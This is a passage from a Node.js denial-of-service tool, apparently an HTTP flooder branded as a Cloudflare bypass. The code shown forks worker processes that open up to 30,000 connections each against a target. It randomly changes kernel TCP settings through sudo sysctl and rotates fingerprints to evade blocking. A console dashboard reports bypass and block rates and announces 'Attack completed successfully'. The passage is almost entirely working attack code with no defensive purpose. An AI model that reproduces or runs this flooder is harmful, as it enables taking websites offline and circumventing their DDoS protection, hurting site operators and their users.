    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];

    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
net.ipv4.tcp_sack=${sack} \
net.ipv4.tcp_window_scaling=${windowScaling} \
net.ipv4.tcp_timestamps=${timestamps} \
net.ipv4.tcp_sack=${selectiveAck} \
net.ipv4.tcp_fastopen=${tcpFastOpen}`;

    exec(command, () => { });
}

setInterval(() => {
    timer++;
}, 1000);

setInterval(() => {
    if (timer <= 10) {
        custom_header = custom_header + 1;
        custom_window = custom_window + 1;
        custom_table = custom_table + 1;
        custom_update = custom_update + 1;
    } else {
        custom_table = 65536;
        custom_window = 6291456;
        custom_header = 262144;
        custom_update = 15663105;
        timer = 0;
    }
}, 10000);

if (cluster.isMaster) {
    const workers = {}
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.clear();
    console.log(`NEW BYPAS CF UPDATE 4,0 - HUMANIZED`);
    console.log(`ATTACK SEND SUCCES - Fingerprint ID: ${currentFingerprintId}`);

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message]
    })
    
    if (debugMode) {
        setInterval(() => {
            let statuses = {};
            let total = 0;
            let goawayCount = 0;
            
            for (let w in workers) {
                if (workers[w][0].state == 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (statuses[code] == null)
                                statuses[code] = 0;
                            statuses[code] += st[code];
                            total += st[code];
                            if (code === 'GOAWAY') {
                                goawayCount += st[code];
                            }
                        }
                    }
                }
            }

            const sortedStatuses = Object.entries(statuses).sort((a, b) => b[1] - a[1]);

            const totalMem = os.totalmem();
            const freeMem = os.freemem();
            const usedMem = totalMem - freeMem;
            const usedMemPercent = ((usedMem / totalMem) * 100).toFixed(2);
            const freeMemPercent = (100 - usedMemPercent).toFixed(2);
            
            const successCodes = ['200', '201', '202', '204', '206'];
            const blockCodes = ['403', '429', '503', '502', '500'];
            const successCount = successCodes.reduce((sum, code) => sum + (statuses[code] || 0), 0);
            const blockCount = blockCodes.reduce((sum, code) => sum + (statuses[code] || 0), 0);
            
            const bypassRate = total > 0 ? ((successCount / total) * 100).toFixed(1) : '0.0';
            const blockRate = total > 0 ? ((blockCount / total) * 100).toFixed(1) : '0.0';
            const goawayRate = total > 0 ? ((goawayCount / total) * 100).toFixed(1) : '0.0';

            console.clear();
            console.log(`╔══════════════════════════════════════════╗`);
            console.log(`║   NEW BYPAS CF UPDATE 4,0 - HUMANIZED    ║`);
            console.log(`║         By: @tyoobae | 𝘛𝘐𝘠𝘖𝘕𝘦𝘵𝘸𝘰𝘳𝘬         ║`);
            console.log(`╚══════════════════════════════════════════╝`);
            console.log(`├─ Target: ${target}`);
            console.log(`├─ Duration: ${time}s | Threads: ${threads} | Rate: ${ratelimit}`);
            console.log(`├─ Memory: ${usedMemPercent}% used | ${freeMemPercent}% free`);
            console.log(`├─ Bypass Rate: ${bypassRate}% ${bypassRate > 30 ? '✅' : '⚠️'}`);
            console.log(`├─ Block Rate: ${blockRate}% ${blockRate < 30 ? '✅' : '⚠️'}`);
            console.log(`├─ GOAWAY Rate: ${goawayRate}% ${goawayRate < 10 ? '✅' : '⚠️'}`);
            console.log(`├─ Fingerprint ID: ${currentFingerprintId}`);
            console.log(`├─ Total Requests: ${total}`);
            console.log(`╠══════════════════════════════════════════╣`);
            console.log(`║           STATUS CODE BREAKDOWN          ║`);
            console.log(`╠══════════════════════════════════════════╣`);

            for (let [code, count] of sortedStatuses) {
                const percentage = total > 0 ? ((count / total) * 100).toFixed(1) : '0.0';
                let indicator = '';
                
                if (successCodes.includes(code)) indicator = '✅';
                else if (blockCodes.includes(code)) indicator = '❌';
                else if (code === 'GOAWAY') indicator = '⚠️';
                else indicator = '📊';
                
                console.log(`║ ${indicator} ${code.padEnd(6)}: ${count.toString().padEnd(8)} (${percentage}%)`);
            }
            
            console.log(`╚══════════════════════════════════════════╝`);
            
            // Automatic fingerprint rotation based on GOAWAY rate
            if (goawayRate > 20) {
                console.log(`[🔄] High GOAWAY rate detected - Rotating fingerprint...`);
                rotateFingerprint();
            }
            
            if (usedMemPercent >= 85) {
                console.log(`[⚠️] Warning: High memory usage detected!`);
            }
            
        }, 1500);
    }
    
    setInterval(TCP_CHANGES_SERVER, 5000);
    setTimeout(() => {
        console.log(`[✅] Attack completed successfully!`);
        process.exit(0);
    }, time * 1000);

} else {
    let conns = 0;

    let i = setInterval(() => {
        if (conns < 30000) {
            conns++;
        } else {
            clearInterval(i);
            return;
        }
        go();
    }, delay);

    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4)
                statusesQ.shift();

            statusesQ.push(statuses);
            statuses = {};
            process.send(statusesQ);
        }, 250);
    }

    setTimeout(() => process.exit(1), time * 1000);
}